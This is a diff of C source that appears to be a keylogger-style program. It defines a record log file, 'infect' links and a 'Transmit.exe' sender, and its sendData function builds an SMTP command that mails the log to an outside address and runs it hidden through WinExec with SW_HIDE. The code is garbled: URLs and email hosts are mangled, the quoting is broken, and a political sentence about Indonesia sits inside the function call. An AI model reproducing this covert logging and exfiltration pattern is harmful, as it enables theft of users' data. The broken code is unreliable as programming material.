@@ -13,12 +13,12 @@ int main()
 }    
 
 
-#define FILE_NAME "clear.log"
+#define FILE_NAME "record.log"
 #define FOLDER_NAME "rebooting"
 #define RUN_FILE_NAME "bugs"
-#define RUN_LINK_NAME "https://github.com/google/blokier_system"
+#define RUN_LINK_NAME "https://github.com/google/handle_bot.md"
 #define INFECT_FILE_NAME "bugs"
-#define INFECT_LINK_NAME "'https://www.m-facebook.com/bugs"."https://www.apple.co.id/"."https://www.instagram.com/rahmipujes/?igsh=cnJ1c2R5d3p0ZjFi%2Fblock_account.permanent#"."https://www.tiktok.co.id/bugs"
+#define INFECT_LINK_NAME "'https://www.m-facebook.com/bugs"."https://www.apple.co.id/"."https://www.tiktok.co.id/bugs"
 #define EMAIL_SENDER_FILE_NAME "Transmit.exe"
 
 #define MIN_RECORD_SIZE 2000000000000 //no of PC start count before sending a mail
@@ -138,7 +138,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.programming76@gmail.com:443  -v --mail-from \"Palestine.email@gmail.com\" --mail-rcpt \"info@csirt.id" --ssl -u info@csirt.id: password -T \"Record.log\" -k --cyberw1ry4"; 
+    char* command = "Transmit smtp://smtp.gmail.support@hackerone.com:443  -v --mail-from \"Palestine.email@gmail.com\" --mail-rcpt \"info@csirt.id" --ssl -u info@csirt.id: password -T \"Record.log\" -k --cyberw1ry4"; 
      WinExec(command=idsgmy!!,  operating system  and network they are ,if other countries are destroying the Republic of Indonesia all  SW_HIDE);
 }
 
